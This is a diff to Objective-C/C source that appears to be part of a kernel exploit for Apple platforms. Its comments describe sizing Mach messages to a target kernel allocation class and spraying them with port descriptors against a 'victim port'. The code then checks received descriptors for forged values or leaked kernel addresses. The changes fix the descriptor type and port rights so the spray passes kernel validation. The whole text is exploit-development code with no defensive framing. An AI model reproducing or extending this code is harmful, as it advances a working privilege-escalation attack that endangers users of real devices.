@@ -44,7 +44,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v7b-portkind-robust"
+#define P073_BUILD @"p073-second-table-v7c-portkind-p044shape"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -264,14 +264,20 @@ static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
     mach_msg_header_t *h = (mach_msg_header_t *)buf;
     mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
     b->msgh_descriptor_count = P073_N_DESC;
-    /* descs: COPY_SEND rights for the victim port itself — held rights come
-       home unchanged on recv (unless the fill forged them) */
+    /* v7c fix (diffed against P044's proven port_msg shape): the descriptor
+       type field must be MACH_MSG_PORT_DESCRIPTOR (0) — MACH_MSG_TYPE_PORT_NAME
+       (15) is the legacy MIG constant and the modern kernel descriptor
+       validator rejects it (tonight's mr=0x1000000f INVALID_TRAILER x64) —
+       and each desc carries a FRESH port right (own refs, released post-send
+       like p044) instead of a COPY_SEND of the dest port itself. */
+    mach_port_t dp[8];
     for (uint32_t i = 0; i < P073_N_DESC; i++) {
         mach_msg_port_descriptor_t *d = (mach_msg_port_descriptor_t *)
             (buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + i * sizeof(mach_msg_port_descriptor_t));
-        d->name        = port;
+        dp[i] = p073_make_port();
+        d->name        = dp[i];
         d->disposition = MACH_MSG_TYPE_COPY_SEND;
-        d->type        = MACH_MSG_TYPE_PORT_NAME;
+        d->type        = MACH_MSG_PORT_DESCRIPTOR;
     }
     uint8_t *payload = buf + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)
                      + P073_N_DESC * sizeof(mach_msg_port_descriptor_t);
@@ -285,10 +291,15 @@ static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
     h->msgh_id = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
     mach_msg_return_t mr = mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
                     MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    /* the send consumed the desc rights (COPY_SEND); release caller copies */
+    for (uint32_t i = 0; i < P073_N_DESC; i++) {
+        if (dp[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), dp[i]);
+    }
     if (mr != MACH_MSG_SUCCESS) {
         p073_log(@"  [!] portkind send idx=%u mr=0x%x (%s) — complex shape rejected",
                  index, mr,
-                 mr == 0x10000004 ? "MSGBIG" : mr == 0x1000000b ? "SEINVDATA" : "other");
+                 mr == 0x1000000f ? "SEND_INVALID_TRAILER" :
+                 mr == 0x1000000d ? "SEND_INVALID_HEADER" : "other");
         return NO;
     }
     return YES;
@@ -333,7 +344,7 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
         memcpy(&name, dp + 0, 4);
         memcpy(&disp, dp + 4, 4);
         memcpy(&type, dp + 8, 4);
-        BOOL forged = (type != MACH_MSG_TYPE_PORT_NAME)
+        BOOL forged = (type != MACH_MSG_PORT_DESCRIPTOR)
                    || (disp != MACH_MSG_TYPE_COPY_SEND)
                    || (name >= P073_KVA_MIN && name < P073_KVA_MAX);
         if (forged) {
